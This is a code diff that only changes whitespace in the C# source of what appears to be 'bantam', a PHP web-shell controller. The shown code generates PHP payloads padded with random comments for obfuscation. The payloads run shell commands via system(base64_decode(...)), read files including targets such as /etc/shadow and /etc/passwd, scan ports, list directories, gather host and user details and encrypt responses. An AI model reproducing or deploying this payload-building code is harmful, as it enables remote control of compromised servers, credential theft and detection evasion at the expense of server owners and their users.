@@ -42,12 +42,12 @@ namespace bantam.Classes
         /// <summary>
         /// Linux File Locations
         /// </summary>
-        public static string linuxFS_ShadowFile         = "/etc/shadow";
-        public static string linuxFS_PasswdFile         = "/etc/passwd";
-        public static string linuxFS_IssueFile          = "/etc/issue.net";
-        public static string linuxFS_hostTargetsFile    = "/etc/hosts";
-        public static string linuxFS_ProcVersion        = "/proc/version";
-        public static string linuxFS_NetworkInterfaces  = "/etc/network/interfaces";
+        public static string linuxFS_ShadowFile = "/etc/shadow";
+        public static string linuxFS_PasswdFile = "/etc/passwd";
+        public static string linuxFS_IssueFile = "/etc/issue.net";
+        public static string linuxFS_hostTargetsFile = "/etc/hosts";
+        public static string linuxFS_ProcVersion = "/proc/version";
+        public static string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
 
         /// <summary>
         /// Windows File Locations
@@ -57,14 +57,14 @@ namespace bantam.Classes
         /// <summary>
         /// OS Commands
         /// </summary>
-        public static string linuxOS_PsAux          = "ps aux";
-        public static string linuxOS_Ifconfig       = "ifconfig";
-        public static string windowsOS_Ipconfig     = "ipconfig";
-        public static string windowsOS_TaskList     = "tasklist";
-        public static string windowsOS_NetUser      = "net user";
-        public static string windowsOS_NetAccounts  = "net accounts";
-        public static string windowsOS_Ver          = "ver";
-        public static string posixOS_Whoami         = "whoami";
+        public static string linuxOS_PsAux = "ps aux";
+        public static string linuxOS_Ifconfig = "ifconfig";
+        public static string windowsOS_Ipconfig = "ipconfig";
+        public static string windowsOS_TaskList = "tasklist";
+        public static string windowsOS_NetUser = "net user";
+        public static string windowsOS_NetAccounts = "net accounts";
+        public static string windowsOS_Ver = "ver";
+        public static string posixOS_Whoami = "whoami";
 
         /// <summary>
         /// 
@@ -86,7 +86,7 @@ namespace bantam.Classes
         {
             //check global cfg check "" if off, and have a slider for amount of comments, and a slider for length of comments
             int length = Helper.RandomNumber(maxNum);
-            return "/*" + Helper.RandomString(length, true, true)  + "*/";
+            return "/*" + Helper.RandomString(length, true, true) + "*/";
         }
 
         /// <summary>
@@ -137,16 +137,16 @@ namespace bantam.Classes
                               + varName + " = base64_encode(" + varName + ");"
                               + RandomPHPComment();
 
-            switch(responseEncryptionMode) {
+            switch (responseEncryptionMode) {
                 case (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL:
-                    encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
-                    break;
+                encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
+                break;
                 case (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT:
-                    encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
-                    break;
+                encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
+                break;
                 default:
-                    encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
-                    break;
+                encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
+                break;
             }
 
             encryption += RandomPHPComment();
@@ -181,8 +181,8 @@ namespace bantam.Classes
             List<string> lines = new List<string> {
                 osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",
 
-                cwdVar + (" = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");" 
-                       + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" + totalfreespaceVar 
+                cwdVar + (" = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");"
+                       + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" + totalfreespaceVar
                        + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;"),
 
                 kernelVar       + " = @php_uname('s');",
@@ -194,7 +194,7 @@ namespace bantam.Classes
 
             Helper.ShuffleList(lines);
 
-            foreach(var line in lines) {
+            foreach (var line in lines) {
                 linesRandomized += line;
                 linesRandomized += RandomPHPComment();
             }
@@ -229,31 +229,31 @@ namespace bantam.Classes
                      + "'." + phpVersionVar + ";";
             }
 
-            return linesRandomized + "if (!function_exists('posix_getegid')) {" 
+            return linesRandomized + "if (!function_exists('posix_getegid')) {"
                                    + RandomPHPComment()
-                                   + userVar + " = @get_current_user();" 
+                                   + userVar + " = @get_current_user();"
                                    + RandomPHPComment()
-                                   + uidVar + " = @getmyuid();" 
+                                   + uidVar + " = @getmyuid();"
                                    + RandomPHPComment()
-                                   + gidVar + " = @getmygid();" 
+                                   + gidVar + " = @getmygid();"
                                    + RandomPHPComment()
-                                   + groupVar + " = '?';" 
+                                   + groupVar + " = '?';"
                                    + RandomPHPComment()
-                                   + "} else {" 
-	                               + uidVar + " = @posix_getpwuid(posix_geteuid());" 
+                                   + "} else {"
+                                   + uidVar + " = @posix_getpwuid(posix_geteuid());"
                                    + RandomPHPComment()
-                                   + gidVar + " = @posix_getgrgid(posix_getegid());" 
+                                   + gidVar + " = @posix_getgrgid(posix_getegid());"
                                    + RandomPHPComment()
-                                   + userVar + "= "+ uidVar + "['name'];" 
+                                   + userVar + "= " + uidVar + "['name'];"
                                    + RandomPHPComment()
-                                   + uidVar + " = "+ uidVar + "['uid'];" 
+                                   + uidVar + " = " + uidVar + "['uid'];"
                                    + RandomPHPComment()
-                                   + gidVar + " = "+ gidVar + "['gid'];" 
+                                   + gidVar + " = " + gidVar + "['gid'];"
                                    + RandomPHPComment()
-                                   + groupVar + " = "+ gidVar + "['name'];" 
+                                   + groupVar + " = " + gidVar + "['name'];"
                                    + RandomPHPComment()
-                                   + "}" 
-                                   + responseCode 
+                                   + "}"
+                                   + responseCode
                                    + RandomPHPComment();
         }
 
@@ -299,7 +299,7 @@ namespace bantam.Classes
                      + "foreach ($ports as $port) {"
                      + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
                      + "if (is_resource($conn)) { "
-                     + "$result .= $port . ' ' . getservbyport($port, 'tcp'). '"+ rowSeperator + "';"
+                     + "$result .= $port . ' ' . getservbyport($port, 'tcp'). '" + rowSeperator + "';"
                      + "fclose($conn);"
                      + "}}"
                      + "if (empty($result)) { $result = 'None'; }";
@@ -328,18 +328,18 @@ namespace bantam.Classes
         public static string PhpInfo(bool encryptResponse)
         {
             if (encryptResponse) {
-                return RandomPHPComment() 
-                      + "@ob_start();" 
+                return RandomPHPComment()
+                      + "@ob_start();"
                       + RandomPHPComment()
-                      + "@phpinfo();" 
+                      + "@phpinfo();"
                       + RandomPHPComment()
-                      + "$result = @ob_get_contents();" 
+                      + "$result = @ob_get_contents();"
                       + RandomPHPComment()
                       + "@ob_end_clean();"
                       + RandomPHPComment();
             } else {
-                return RandomPHPComment() 
-                       + "phpinfo();" 
+                return RandomPHPComment()
+                       + "phpinfo();"
                        + RandomPHPComment();
             }
         }
@@ -353,13 +353,13 @@ namespace bantam.Classes
         {
             string phpTestExecutionWithEcho = string.Empty;
             if (encryptReponse) {
-                phpTestExecutionWithEcho = RandomPHPComment() 
-                                         + "$result = '1';" 
+                phpTestExecutionWithEcho = RandomPHPComment()
+                                         + "$result = '1';"
                                          + RandomPHPComment();
 
             } else {
-                phpTestExecutionWithEcho = RandomPHPComment() 
-                                         + "echo '1';" 
+                phpTestExecutionWithEcho = RandomPHPComment()
+                                         + "echo '1';"
                                          + RandomPHPComment();
             }
             return phpTestExecutionWithEcho;
@@ -427,12 +427,12 @@ namespace bantam.Classes
         public static string ReadFile(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
-                return RandomPHPComment() 
-                     + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
+                return RandomPHPComment()
+                     + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
                      + RandomPHPComment();
             } else {
-                return RandomPHPComment() 
-                     + "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
+                return RandomPHPComment()
+                     + "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
                      + RandomPHPComment();
             }
         }
@@ -486,11 +486,11 @@ namespace bantam.Classes
         {
             code = Helper.EncodeBase64ToString(code);
             if (encryptResponse) {
-                return RandomPHPComment() 
-                    + "@ob_start();" 
-                    + RandomPHPComment() 
-                    + "@system(base64_decode('" + code + "'));" 
-                    + RandomPHPComment() 
+                return RandomPHPComment()
+                    + "@ob_start();"
+                    + RandomPHPComment()
+                    + "@system(base64_decode('" + code + "'));"
+                    + RandomPHPComment()
                     + "$result = @ob_get_contents();"
                     + RandomPHPComment()
                     + "@ob_end_clean();"
@@ -512,10 +512,10 @@ namespace bantam.Classes
             string varFile = RandomPHPVar();
 
             if (responseEncryption) {
-                return RandomPHPComment() 
+                return RandomPHPComment()
                  + @"$result='';"
-                 + @" try{ " + RandomPHPComment() 
-                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment() 
+                 + @" try{ " + RandomPHPComment()
+                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment()
                  + @"$result .= " + varItem + "->getBasename().'" + g_delimiter + "'."
                         + varItem + "->getPath().'" + g_delimiter + "'."
                         + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
